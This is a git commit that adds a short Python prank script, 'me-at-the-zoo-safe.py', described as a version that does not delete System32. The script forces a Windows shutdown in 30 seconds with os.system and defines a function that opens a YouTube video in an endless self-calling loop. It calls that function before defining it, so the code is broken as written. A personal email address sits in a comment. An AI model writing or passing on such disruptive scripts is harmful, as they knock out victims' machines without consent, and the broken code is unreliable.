6fec62475063605b6f7e015c1e2910a0a033431b
parker haddad <110338441+ParkFailz@users.noreply.github.com>
2024-02-14 14:12:56 -0800

    added uncompiled safe version
    added version that dose not remove system 32

---
+++ me-at-the-zoo-safe.py
@@ -0,0 +1,12 @@
+import webbrowser, time, os
+def shutdown():
+    os.system("shutdown /s /t 30")
+    zooopen()
+    
+
+shutdown()
+def zooopen():
+    webbrowser.open ("https://www.youtube.com/watch?v=jNQXAC9IVRw")
+    zooopen()
+
+#Wesleypeter2011@gmail.com
